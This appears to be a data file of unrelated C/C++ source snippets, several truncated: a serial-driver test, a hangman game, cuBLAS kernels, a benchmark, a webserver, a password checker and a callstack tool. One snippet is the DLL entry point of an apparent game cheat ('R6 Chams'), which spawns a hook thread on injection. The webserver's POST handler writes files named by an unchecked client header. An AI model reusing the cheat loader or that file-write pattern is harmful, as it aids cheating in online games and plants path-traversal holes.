    "// Copyright 2021 RoboMaster-OSS\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n#include <memory>\n#include <string>\n#include <vector>\n\n#include \"dummy_transporter.hpp\"\n#include \"gtest/gtest.h\"\n#include \"rm_serial_driver/fixed_packet.hpp\"\n#include \"rm_serial_driver/fixed_packet_tool.hpp\"\n\nusing namespace fyt;\nTEST(FixedPacketTool, construct_with_nullptr) {\n  EXPECT_THROW(serial_driver::FixedPacketTool<32>(nullptr), std::invalid_argument);\n}\n\nTEST(FixedPacketTool, send_and_recv) {\n  auto factory = std::make_shared<TransporterFactory>();\n  auto transporter1 = factory->get_transporter1();\n  auto transporter2 = factory->get_transporter2();\n  auto packet_tool1 = std::make_shared<serial_driver::FixedPacketTool<32>>(transporter1);\n  auto packet_tool2 = std::make_shared<serial_driver::FixedPacketTool<32>>(transporter2);\n  serial_driver::FixedPacket<32> packet1, packet2;\n  // send\n  int a = 10;\n  packet1.loadData(a, 10);\n  bool send_ret = packet_tool1->sendPacket(packet1);\n  ASSERT_TRUE(send_ret);\n  // recv\n  int b;\n  bool recv_ret = packet_tool2->recvPacket(packet2);\n  ASSERT_TRUE(recv_ret);\n  packet2.unloadData<int>(b, 10);\n  EXPECT_EQ(a, b);\n}\n\nTEST(FixedPacketTool, realtime_send) {\n  auto factory = std::make_shared<TransporterFactory>();\n  auto transporter1 = factory->get_transporter1();\n  auto transporter2 = factory->get_transporter2();\n  auto packet_tool1 = std::make_shared<serial_driver::FixedPacketTool<32>>(transporter1);\n  auto packet_tool2 = std::make_shared<serial_driver::FixedPacketTool<32>>(transporter2);\n  packet_tool1->enbaleRealtimeSend(true);\n  serial_driver::FixedPacket<32> packet1, packet2;\n  // recv\n  auto t = std::thread([&]() {\n    int b;\n    for (int i = 0; i < 10; i++) {\n      bool recv_ret = packet_tool2->recvPacket(packet2);\n      ASSERT_TRUE(recv_ret);\n      packet2.unloadData<int>(b, 10);\n      EXPECT_EQ(i, b);\n    }\n  });\n  // send\n  for (int i = 0; i < 10; i++) {\n    packet1.loadData(i, 10);\n    bool send_ret = packet_tool1->sendPacket(packet1);\n    ASSERT_TRUE(send_ret);\n  }\n  t.join();\n}",
    "#include <iostream>\n#include <string>\n#include <raylib.h>\n#include <vector>\n#include <sstream>  // Include the sstream header for stringstream\n#include <cmath>\n#include <raymath.h>\n#include <algorithm> \n\nusing namespace std;\n\ntemplate <typename T>\nT Clamp(T value, T min, T max) {\n    if (value < min) return min;\n    if (value > max) return max;\n    return value;\n}\n// Game update that for long a player can go (how many words can you guess within the maxAttempts.)\n// Keeping the score of it along with player name\n\nenum GameState {\n    STARTUP,\n    PLAYING,\n    WON,\n    SETTINGS\n};\n// Hangman images ka banna aur girna all shuru\n// Related to drawing images\nvector<Texture2D> hangmanImages;\nbool imagesLoaded = false;\nint clickCount = 0;  // Counter for the number of clicks\nbool startFalling = false;  // Flag to start the falling animation\nfloat fallSpeed = 4.0f;  // Speed of the falling animation\nvector<Vector2> positions;  // Vector to store positions of images\nvector<Vector2> fallPositions;  // Vector to store falling positions\nvector<float> rotations;  // Vector to store rotation angles of images\n\nconst float fallLimit = 450.0f;  // Height where the images should stop falling\n\n// Function to initialize hangman images\nvoid LoadHangmanImages() {\n    hangmanImages.push_back(LoadTexture(\"assets/frame.png\"));\n    hangmanImages.push_back(LoadTexture(\"assets/noose.png\"));\n    hangmanImages.push_back(LoadTexture(\"assets/body01-head.png\"));\n    hangmanImages.push_back(LoadTexture(\"assets/body01-shirt.png\"));\n    hangmanImages.push_back(LoadTexture(\"assets/body01-shorts.png\"));\n    hangmanImages.push_back(LoadTexture(\"assets/body01-leftarm.png\"));\n    hangmanImages.push_back(LoadTexture(\"assets/body01-rightarm.png\"));\n    hangmanImages.push_back(LoadTexture(\"assets/body01-leftleg.png\"));\n    // hangmanImages.push_back(LoadTexture(\"assets/body01-rightleg.png\"));\n    hangmanImages.push_back(LoadTexture(\"assets/body01-head-worried.png\"));  // New face texture\n    hangmanImages.push_back(LoadTexture(\"assets/body01-head-dead.png\"));  // New face texture\n    imagesLoaded = true;\n\n    // Initialize positions for the images\n    positions = {\n        {50, 50},    // frame\n        {180, 80},   // noose\n        {155, 100},  // head (adjusted to appear over the t-shirt)\n        {130, 200},  // t-shirt\n        {160, 300},  // shorts\n        {105, 230},  // left arm (adjusted to align with t-shirt)\n        {170, 220},  // right arm (adjusted to align with t-shirt)\n        {145, 330},  // left leg\n        // {170, 300},  // right leg\n        {155, 100},   // extra face\n        {155, 100}   // extra face\n    };\n\n    // Initialize falling positions (same as original positions initially)\n    fallPositions = positions;\n\n    // Initialize rotations for the images\n    rotations.resize(hangmanImages.size(), 0.0f);\n}\n\nvoid UnloadHangmanImages() {\n    for (auto& image : hangmanImages) {\n        UnloadTexture(image);\n    }\n    hangmanImages.clear();\n    imagesLoaded = false;\n    clickCount = 0; // Reset click count to initial value\n    startFalling = false;  // Reset falling animation\n}\n\n// Constants\nconst int maxIncorrectGuesses = 6;  // Number of stages in the hangman\n\n// Global Variables\nint incorrectGuesses = 0;\n\n// Function to draw hangman images based on the number of clicks\nvoid DrawHangmanImages(int clicks) {\n    for (size_t i = -1; i < clicks && i < hangmanImages.size(); i++) {\n        if ( i == 5 && clicks > 5) {  // Draw face worried when left arm appears\n            DrawTexture(hangmanImages[8], positions[8].x, positions[8].y, WHITE);\n        }\n        DrawTexture(hangmanImages[i], positions[i].x, positions[i].y, WHITE);\n        if (i == 3 && clicks > 3) {  // Redraw the head after the t-shirt to ensure it appears on top\n            DrawTexture(hangmanImages[2], positions[2].x, positions[2].y, WHITE);\n        }\n        if (i == 8 && clicks > 8) {  // Draw face dead just before drawing the right leg\n            DrawTexture(hangmanImages[9], positions[9].x, positions[9].y, WHITE);\n        }\n    }\n}\n\n// Function to handle incorrect guesses\nvoid HandleIncorrectGuess() {\n    incorrectGuesses++;\n    if (incorrectGuesses > maxIncorrectGuesses) {\n        incorrectGuesses = maxIncorrectGuesses;  // Cap at max incorrect guesses\n    }\n}\n\n// Function to draw falling hangman images with rotation\nvoid DrawFallingImages() {\n    for (size_t i = 1; i < hangmanImages.size(); i++) {\n        if (i == 1) {\n            DrawTexture(hangmanImages[i], fallPositions[i].x, fallPositions[i].y, WHITE); // Draw the noose normally\n        } else {\n            DrawTexturePro(\n                hangmanImages[i],\n                {0, 0, (float)hangmanImages[i].width, (float)hangmanImages[i].height},\n                {fallPositions[i].x + hangmanImages[i].width / 2, fallPositions[i].y + hangmanImages[i].height / 2, (float)hangmanImages[i].width, (float)hangmanImages[i].height},\n                {(float)hangmanImages[i].width / 2, (float)hangmanImages[i].height / 2},\n    ",
    "#include <torch/extension.h>\n#include <cublasLt.h>\n#include <cuda_runtime.h>\n#include <iostream>\n#include <ATen/cuda/CUDAContext.h>\n#include <ATen/cuda/Exceptions.h>\n\n// cuBLAS error checking\nvoid cublasCheck(cublasStatus_t status, const char *file, int line)\n{\n    if (status != CUBLAS_STATUS_SUCCESS)\n    {\n        printf(\"[cuBLAS ERROR]: %d %s %d\\n\", status, file, line);\n        exit(EXIT_FAILURE);\n    }\n}\n#define cublasCheck(status)                        \\\n    {                                              \\\n        cublasCheck((status), __FILE__, __LINE__); \\\n    }\n\n// CUDA error checking\n#define cudaCheck(status)                                                                                                 \\\n    {                                                                                                                     \\\n        cudaError_t err = status;                                                                                         \\\n        if (err != cudaSuccess)                                                                                           \\\n        {                                                                                                                 \\\n            std::cerr << \"CUDA Error: \" << cudaGetErrorString(err) << \" at \" << __FILE__ << \":\" << __LINE__ << std::endl; \\\n            exit(EXIT_FAILURE);                                                                                           \\\n        }                                                                                                                 \\\n    }\n\n#define SET_LAYOUT_ORDER(desc, order) cublasCheck(cublasLtMatrixLayoutSetAttribute(desc, CUBLASLT_MATRIX_LAYOUT_ORDER, &order, sizeof(order)))\n\ntorch::Tensor transform_col32_to_row(torch::Tensor A)\n{\n\n    A = A.contiguous();\n    int n = A.size(0), m = A.size(1);\n    cublasLtHandle_t handle = reinterpret_cast<cublasLtHandle_t>(\n        at::cuda::getCurrentCUDABlasHandle());\n\n    cublasLtMatrixLayout_t layoutA;\n    int ld = n * 32;\n    cublasCheck(cublasLtMatrixLayoutCreate(&layoutA, CUDA_R_32I, n, m, ld));\n    cublasLtOrder_t col32 = CUBLASLT_ORDER_COL32;\n    SET_LAYOUT_ORDER(layoutA, col32);\n\n    cublasLtMatrixLayout_t outLayout;\n    cublasCheck(cublasLtMatrixLayoutCreate(&outLayout, CUDA_R_32I, n, m, m));\n    cublasLtOrder_t order = CUBLASLT_ORDER_ROW;\n    SET_LAYOUT_ORDER(outLayout, order);\n\n    auto options = torch::TensorOptions().dtype(torch::kInt32).device(A.device());\n    auto output = torch::empty({n, m}, options);\n\n    cublasLtMatrixTransformDesc_t transformDesc;\n    cublasCheck(cublasLtMatrixTransformDescCreate(&transformDesc, CUDA_R_32F));\n\n    float alpha = 1.0f, beta = 0.0f;\n    cublasCheck(cublasLtMatrixTransform(\n        handle,\n        transformDesc,\n        &alpha,\n        A.data_ptr<int32_t>(), layoutA,\n        &beta,\n        nullptr, nullptr,\n        output.data_ptr<int32_t>(), outLayout, 0));\n\n    cublasCheck(cublasLtMatrixLayoutDestroy(outLayout));\n    cublasCheck(cublasLtMatrixLayoutDestroy(layoutA));\n    cublasCheck(cublasLtMatrixTransformDescDestroy(transformDesc));\n\n    return output;\n}\n\ntypedef enum Format_t\n{\n    COL32 = 0,\n    AMPERE = 1,\n} Transform_t;\n\ntemplate <int FORMAT>\ntorch::Tensor transform_from_row_to(torch::Tensor A)\n{\n    A = A.contiguous();\n    int n = A.size(0), m = A.size(1);\n    cublasLtHandle_t handle = reinterpret_cast<cublasLtHandle_t>(\n        at::cuda::getCurrentCUDABlasHandle());\n\n    cublasLtMatrixLayout_t Alayout;\n    cublasCheck(cublasLtMatrixLayoutCreate(&Alayout, CUDA_R_8I, n, m, m));\n    cublasLtOrder_t order = CUBLASLT_ORDER_ROW;\n    SET_LAYOUT_ORDER(Alayout, order);\n\n    auto options = torch::TensorOptions().dtype(torch::kInt8).device(A.device());\n    auto output = torch::empty({n, m}, options);\n\n    cublasLtMatrixLayout_t outLayout;\n\n    if (FORMAT == AMPERE)\n    {\n        int ld = (n + 31) / 32 * 32 * 32;\n        cublasCheck(cublasLtMatrixLayoutCreate(&outLayout, CUDA_R_8I, n, m, ld));\n        cublasLtOrder_t colAmpere = CUBLASLT_ORDER_COL32_2R_4R4;\n        SET_LAYOUT_ORDER(outLayout, colAmpere);\n    }\n    else if (FORMAT == COL32)\n    {\n        int ld = n * 32;\n        cublasCheck(cublasLtMatrixLayoutCreate(&outLayout, CUDA_R_8I, n, m, ld));\n        cublasLtOrder_t col32 = CUBLASLT_ORDER_COL32;\n        SET_LAYOUT_ORDER(outLayout, col32);\n    }\n    else\n    {\n        std::cerr << \"Invalid format\" << std::endl;\n        exit(EXIT_FAILURE);\n    }\n\n    cublasLtMatrixTransformDesc_t transformDesc;\n    cublasCheck(cublasLtMatrixTransformDescCreate(&transformDesc, CUDA_R_32F));\n\n    float alpha = 1.0f, beta = 0.0f;\n    cublasCheck(cublasLtMatrixTransform(\n        handle,\n        transformDesc,\n        &alpha,\n        A.data_ptr<int8_t>(), Alayout,\n        &beta,\n        nullptr, nullptr,\n        output.data_ptr<int8_t>(), outLayout, 0));\n\n    cublasCheck(cublasLtMatrixLayoutDestroy(Alayout));\n    cublasCheck(cublasLtMatrixTransformDescDestroy(transformDesc));\n\n    return output;\n}\ntempla",
    "#include \"nanobench.h\"\n\n#include <cassert>\n#include <cstdlib>\n#include <random>\n#include <string>\n#include <string_view>\n#include <vector>\n\n#include <fcntl.h> // O_RDONLY\n#include <sys/stat.h> // fstat\n#include <unistd.h> // read\n\n#include <x86intrin.h>\n\nusing needle_t = uint64_t;\n\nextern \"C\" {\n    ssize_t max_word_frequency_khash(const char *const words[], size_t len);\n    ssize_t max_word_frequency_kbtree(const char *const words[], size_t len);\n    ssize_t max_word_frequency_qptrie(const char *const words[], size_t len);\n}\n\ntemplate <typename Engine, typename Dist>\nauto prepare_random_input(Engine& engine, Dist& dist, const std::vector<const char*>& dictionary,  size_t output_size)\n{\n\n    std::vector<const char*> res {};\n    res.reserve(output_size);\n\n    for (size_t i=0; i < output_size; i++) {\n        const char* w = dictionary[dist(engine) % dictionary.size()];\n        res.push_back(w);\n    }\n\n    return res;\n}\n\ntemplate <typename Dist, typename F>\nvoid run_benchmark(const char* title, \n                   const char* name,\n                   Dist dist,\n                   const std::vector<const char*>& dictionary,\n                   size_t output_size,\n                   F func) {\n    using namespace ankerl::nanobench;\n    using namespace std;\n    random_device random_device {};\n    mt19937 random_engine {random_device()};\n    random_engine.seed(42);\n\n    Bench().title(title).minEpochIterations(32ul)\n           .run(name, [&random_engine, &dist, &dictionary, output_size, func]() {\n        auto words = prepare_random_input(random_engine, dist, dictionary, output_size);\n        auto res = func(words.data(), words.size());\n\n        doNotOptimizeAway(res);\n    });\n}\n\nstd::string buffer_from_file(const char* path) {\n    int fd = open(path, O_RDONLY);\n    struct stat st;\n    fstat(fd, &st);\n\n    std::string res(st.st_size, '\\0');\n    read(fd, res.data(), res.size());\n\n    return res;\n}\n\nstd::vector<const char*> lines_from_buffer(std::string_view sv) {\n    std::vector<const char*> res {}; \n\n    while (sv.size() > 0ul) {\n        res.push_back(sv.data());\n        size_t shift = sv.find_first_of('\\0'); \n        sv = sv.substr(shift + 1ul);\n    }\n\n    return res;\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 2) { return 1; }\n    auto buf = buffer_from_file(argv[1]);\n    auto dict = lines_from_buffer(buf);\n    //auto words = prepare_random_input(dict, 8 * 1024ul);\n    \n    std::uniform_int_distribution<size_t> uniform {};\n    std::geometric_distribution<size_t> geom {};\n    size_t NUM_KEYS = 128 * 1024ul;\n    \n    run_benchmark(\"geometric\", \"do nothing\", geom, dict, NUM_KEYS, [](auto a1, auto a2) { return 0; });\n    run_benchmark(\"geometric\", \"khash\", geom, dict, NUM_KEYS, max_word_frequency_khash);\n    run_benchmark(\"geometric\", \"kbtree\", geom, dict, NUM_KEYS, max_word_frequency_kbtree);\n    run_benchmark(\"geometric\", \"qptrie\", geom, dict, NUM_KEYS, max_word_frequency_qptrie);\n    \n    run_benchmark(\"uniform\", \"do nothing\", uniform, dict, NUM_KEYS, [](auto a1, auto a2) { return 0; });\n    run_benchmark(\"uniform\", \"khash\", uniform, dict, NUM_KEYS, max_word_frequency_khash);\n    run_benchmark(\"uniform\", \"kbtree\", uniform, dict, NUM_KEYS, max_word_frequency_kbtree);\n    run_benchmark(\"uniform\", \"qptrie\", uniform, dict, NUM_KEYS, max_word_frequency_qptrie);\n\n    return EXIT_SUCCESS;\n}\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   ResposeMethods.cpp                                 :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: alappas <alappas@student.42wolfsburg.de    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/06/03 14:50:57 by alappas           #+#    #+#             */\n/*   Updated: 2024/06/03 14:50:58 by alappas          ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"../../inc/HttpResponse.hpp\"\n\npthread_mutex_t g_write;\n\nint HttpResponse::GET()\n{ \n    pthread_mutex_lock(&g_write);\n    if (!file_)\n    {\n        std::cerr << \"File not found\" << std::endl;\n        pthread_mutex_unlock(&g_write);\n        return 500;\n    }\n\n    if (config_.getAutoIndex() && file_->is_directory())\n    {\n        headers_[\"Content-Type\"] = \"text/html; charset=UTF-8\";\n        body_ = file_->listDir(config_.getRequestTarget());\n    }\n    else\n    {\n        std::string mimeType = file_->getMimeType(file_->getMimeExt());\n        if (mimeType.empty())\n            mimeType = \"application/octet-stream\";\n        headers_[\"Content-Type\"] = mimeType;\n\n        if (!charset_.empty())\n            headers_[\"Content-Type\"] += \"; charset=\" + charset_;\n\n        body_ = file_->getContent();\n    }\n    headers_[\"Content-Length\"] = ftos(body_.length());\n    headers_[\"Cache-Control\"] = \"no-cache\";\n    pthread_mutex_unlock(&g_write);\n\n    return 200;\n}\n\nint HttpResponse::POST() {\n    int status_code = 500;\n    body_ = config_.getBody();\n\n    pthread_mutex_lock(&g_write);\n    if (!file_->exists()) {\n        file_->createFile(body_);\n        status_code = 201;\n    } else {\n        MimeTypes mimeTypes;\n        std::string contentType = config_.getHeader(\"content-type\");\n        bool isMultipart = containsBoundary(contentType);\n        std::string boundary = isMultipart ? extractBoundary(contentType) : contentType;\n\n        if (isMultipart && !boundary.empty()) {\n            std::string filename = extractFilename(body_);\n            std::string fileContent = extractContent(body_, boundary);\n            body_.clear();\n            body_.append(fileContent);\n            if (!filename.empty() && !fileContent.empty()) {\n                file_->appendFile(fileContent, filename);\n                status_code = 201;\n            } else {\n                status_code = 400;\n            }\n        } else {\n            std::string ext = mimeTypes.getType(boundary);\n            if (ext.empty()) {\n                std::cerr << \"Invalid content type\" << std::endl;\n                status_code = 415;\n            } else {\n                std::string default_name = \"default\" + ext;\n                std::string x_filename = config_.getHeader(\"X-Filename\");\n                x_filename = x_filename.empty() ? default_name : x_filename;\n                file_->appendFile(body_, x_filename);\n                status_code = 201;\n            }\n        }\n    }\n\n    pthread_mutex_unlock(&g_write);\n    headers_[\"Content-Length\"] = ftos(body_.length());\n\n    if (!file_->getFilePath().empty())\n        headers_[\"Location\"] = file_->getFilePath();\n\n    return status_code;\n}\n\n// int HttpResponse::PUT() {\n//     pthread_mutex_lock(&g_write);\n\n//     int status_code = 500;\n\n//     if (!file_) {\n//         std::cerr << \"File not found\" << std::endl;\n//         pthread_mutex_unlock(&g_write);\n//         return 500;\n//     }\n\n//     if (file_->exists()) {\n//         // Update existing file\n//         if (file_->updateFile(config_.getBody())) {\n//             status_code = 200; // or 204 if no content in response is desired\n//         } else {\n//             std::cerr << \"Failed to update file\" << std::endl;\n//             status_code = 500;\n//         }\n//     } else {\n//         // Create new file\n//         if (file_->createFile(config_.getBody())) {\n//             status_code = 201;\n//         } else {\n//             std::cerr << \"Failed to create file\" << std::endl;\n//             status_code = 500;\n//         }\n//     }\n\n//     pthread_mutex_unlock(&g_write);\n//     return status_code;\n// }\n\n// int HttpResponse::PUT() {\n//     pthread_mutex_lock(&g_write);\n\n//     int status_code = 500;\n\n//     if (!file_) {\n//         std::cerr << \"File not found\" << std::endl;\n//         pthread_mutex_unlock(&g_write);\n//         return 500;\n//     }\n    \n//     if (file_->exists()) {\n//         MimeTypes mimeTypes;\n//         std::string contentType = config_.getHeader(\"content-type\");\n//         bool isMultipart = containsBoundary(contentType);\n//         std::string boundary = isMultipart ? e",
    "\r\n#include <bits/stdc++.h> \r\nusing namespace std; \r\n\r\nvoid printStrongNess(string& input) \r\n{ \r\n\tint n = input.length(); \r\n\r\n\tbool hasLower = false, hasUpper = false; \r\n\tbool hasDigit = false, specialChar = false; \r\n\tstring normalChars = \"abcdefghijklmnopqrstu\"\r\n\t\t\"vwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 \"; \r\n\r\n\tfor (int i = 0; i < n; i++) { \r\n\t\tif (islower(input[i])) \r\n\t\t\thasLower = true; \r\n\t\tif (isupper(input[i])) \r\n\t\t\thasUpper = true; \r\n\t\tif (isdigit(input[i])) \r\n\t\t\thasDigit = true; \r\n\r\n\t\tsize_t special = input.find_first_not_of(normalChars); \r\n\t\tif (special != string::npos) \r\n\t\t\tspecialChar = true; \r\n\t} \r\n\r\n\t// Strength of password \r\n\tcout << \"Strength of password:-\"; \r\n\tif (hasLower && hasUpper && hasDigit && \r\n\t\tspecialChar && (n >= 8)) \r\n\t\tcout << \"Strong\" << endl; \r\n\telse if ((hasLower || hasUpper) && \r\n\t\t\tspecialChar && (n >= 6)) \r\n\t\tcout << \"Moderate\" << endl; \r\n\telse\r\n\t\tcout << \"Weak\" << endl; \r\n} \r\n\r\n\r\nint main() \r\n{ \r\n\tstring input ;\r\n    cout << \"Enter your password : \" ;\r\n    cin >> input ; \r\n\tprintStrongNess(input); \r\n\treturn 0; \r\n}\r\n",
    "#define WIN32_LEAN_AND_MEAN\n#include <Windows.h>\n#include \"Hook.hpp\"\n\n#ifdef _DEBUG\n    #include <cstdio>\n#endif\n\nBOOL WINAPI DllMain( HMODULE hModule,\n                       DWORD  ul_reason_for_call,\n                       LPVOID lpReserved\n                     )\n{\n    DisableThreadLibraryCalls(hModule);\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n#ifdef _DEBUG\n        AllocConsole();\n        AttachConsole(GetCurrentProcessId());\n        SetConsoleTitleW(L\"R6 Chams by Igromanru\");\n        freopen(\"CON\", \"w\", stdout);\n#endif\n        if (const auto threadHandle = CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(Hook::Init), nullptr, 0, nullptr))\n        {\n            CloseHandle(threadHandle);\n            return TRUE;\n        }\n        return FALSE;\n    case DLL_PROCESS_DETACH:\n        Hook::Unload();\n#ifdef _DEBUG\n        Sleep(200);\n        fclose(stdout);\n        FreeConsole();\n#endif\n        return TRUE;\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n        break;\n    }\n    return TRUE;\n}\n",
    "// CallstackResolver.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n#include <Windows.h>\n#include <DbgHelp.h>\n\n#include <string>\n#include <vector>\n#include <map>\n#include <iostream>\n#include <filesystem>\n#include <array>\n\n#include \"Context.h\"\n#include \"HttpGet.h\"\n\n#pragma comment(lib, \"dbghelp.lib\")\n\nnamespace {\n\tstd::wstring GetLastErrorAsWString()\n\t{\n\t\tDWORD errorMessageID = ::GetLastError();\n\t\tif (errorMessageID == 0) {\n\t\t\treturn std::wstring();\n\t\t}\n\n\t\tLPWSTR messageBuffer = nullptr;\n\t\tsize_t size = FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,\n\t\t\tNULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR)&messageBuffer, 0, NULL);\n\n\t\tstd::wstring message(messageBuffer, size);\n\t\tLocalFree(messageBuffer);\n\n\t\treturn message;\n\t}\n\n\tstd::filesystem::path GetExePath()\n\t{\n\t\tstd::vector<wchar_t>    u16buf(1024, L'\\0');\n\n\t\tGetModuleFileName(NULL, u16buf.data(), 1023);\n\t\tstd::filesystem::path p(u16buf.data());\n\n\t\tif (!p.has_parent_path())\n\t\t\treturn std::filesystem::path();\n\t\treturn p.parent_path();\n\t}\n\n\tstd::tuple<std::filesystem::path, std::wstring> SearchFile(const std::wstring_view& defaultFileName, bool is_optional, std::wstring argFileStr)\n\t{\n\t\tstd::filesystem::path   targetPath;\n\t\tbool\t\t\t\t\tisDefaultFile = false;\n\n\t\tif (!argFileStr.empty()) {\n\t\t\t// The file name or path is specified.\n\t\t\tstd::filesystem::path p(argFileStr);\n\t\t\tif (!p.is_absolute()) {\n\t\t\t\ttargetPath = std::filesystem::current_path() / p;\n\t\t\t}\n\t\t\telse {\n\t\t\t\ttargetPath = p;\n\t\t\t}\n\n\t\t\tif (!std::filesystem::is_regular_file(targetPath)) {\n\t\t\t\tstd::wstringstream ss;\n\t\t\t\tss << L\"Failed to find the file, \\\"\" << targetPath.wstring() << L\"\\\".\";\n\t\t\t\treturn { std::filesystem::path(), ss.str() };\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\t// default behavior. check the file with the default name placed next to the exe file.\n\t\t\ttargetPath = GetExePath() / defaultFileName;\n\t\t\tif (!std::filesystem::is_regular_file(targetPath)) {\n\t\t\t\tif (!is_optional) {\n\t\t\t\t\tstd::wstringstream ss;\n\t\t\t\t\tss << L\"Failed to find the file, \\\"\" << targetPath.wstring() << L\"\\\".\";\n\t\t\t\t\treturn { std::filesystem::path(), ss.str() };\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\t// make it empty.\n\t\t\t\t\ttargetPath.clear();\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tisDefaultFile = true;\n\t\t\t}\n\t\t}\n\n\t\tstd::wstring  retStr;\n\t\tif (isDefaultFile) {\n\t\t\tretStr += L\"DefaultFile\";\n\t\t}\n\n\t\treturn { targetPath, retStr };\n\t}\n\n\tstd::wstring ParseArguments(const int argc, const wchar_t** argv, bool& verbose, bool& json, bool& cin, std::wstring& configFile, std::wstring& textFile)\n\t{\n\t\tconstexpr std::wstring_view flags[] = {L\"--verbose\", L\"--json\", L\"--cin\", L\"--config\", L\"--text\", };\n\t\tenum flagIdx : size_t {\n\t\t\teVerbose = 0,\n\t\t\teJson,\n\t\t\teCin,\n\t\t\teConfg,\n\t\t\teText\n\t\t};\n\n\t\tverbose = json = cin = false;\n\t\tconfigFile.clear();\n\t\ttextFile.clear();\n\n\t\tif (argc < 2)\n\t\t\treturn std::wstring();\n\n\t\tstd::list<std::wstring> args;\n\t\tfor (size_t i = 0; i < argc; ++i) {\n\t\t\targs.push_back(argv[i]);\n\t\t}\n\n\t\t// Check if there is an unknown flag starts with \"--\"\n\t\tfor (auto itr = ++args.begin(); itr != args.end(); ++itr) {\n\t\t\tauto& arg(*itr);\n\n\n\t\t\tif (arg.rfind(L\"--\", 0) == 0) {\n\t\t\t\t// start with \"--\"\n\t\t\t\tbool isAFlag = false;\n\t\t\t\tfor (auto& f : flags) {\n\t\t\t\t\t// is a flag.\n\t\t\t\t\tif (arg.rfind(f, 0) == 0 && arg.length() == f.length()) {\n\t\t\t\t\t\tisAFlag = true;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif (!isAFlag) {\n\t\t\t\t\tstd::wstringstream ss;\n\t\t\t\t\tss << L\"Invlid flag dtected. \\\"\" << arg << \"\\\".\";\n\t\t\t\t\treturn ss.str();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tauto stripDQ = [](const std::wstring& src) -> std::wstring {\n\t\t\tauto b = src.find_first_of(L'\\\"', 0);\n\t\t\tauto e = src.find_last_of(L'\\\"', 0);\n\n\t\t\tif (b != std::string::npos && e != std::string::npos)\n\t\t\t\treturn src.substr(b + 1, e - b - 1);\n\t\t\treturn src;\n\t\t\t};\n\n\n\t\t// parse arguments.\n\t\tfor (auto itr = ++args.begin(); itr != args.end();) {\n\t\t\tauto& arg(*itr);\n\n\t\t\tauto checkFlag = [&](const std::wstring_view flag) -> bool {\n\t\t\t\tif (arg.rfind(flag, 0) == 0) {\n\t\t\t\t\titr = args.erase(itr);\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t\treturn false;\n\t\t\t\t};\n\n\t\t\tstd::wstring errStr;\n\t\t\tauto checkFlagAndArg = [&](const std::wstring_view flag, std::wstring& dst) -> bool {\n\t\t\t\tif (checkFlag(flag)) {\n\t\t\t\t\t// flag found. get next token.\n\t\t\t\t\tif (itr == args.end()) {\n\t\t\t\t\t\tstd::wstringstream ss;\n\t\t\t\t\t\tss << L\"\\\"\" << flag << L\"\\\" needs to be set with an argument.\";\n\t\t\t\t\t\terrStr = ss.str();\n\t\t\t\t\t\treturn true;\n\t\t\t\t\t}\n\t\t\t\t\tdst = stripDQ(*itr);\n\t\t\t\t\titr = args.erase(itr);\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t\treturn false;\n\t\t\t\t};\n\n\t\t\tif (checkFlag(flags[eVerbose])) {\n\t\t\t\tverbose = true;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (checkFlag(flags[eJson])) {\n\t\t\t\tjson = true;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (checkFlag(flags[eCin])) {\n\t\t\t\tcin = true;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (checkFlagAndArg(flags[eConfg], configFile)) {\n\t\t\t\tif (!errStr.empty()) {\n\t\t\t\t\treturn errStr;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (checkFlagAndArg(flags[eText], textFile)) {\n\t\t\t\tif (!errStr.empty()) {\n\t\t\t\t\treturn errStr;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\t++itr;\n\t\t}\n\n\t\t//",
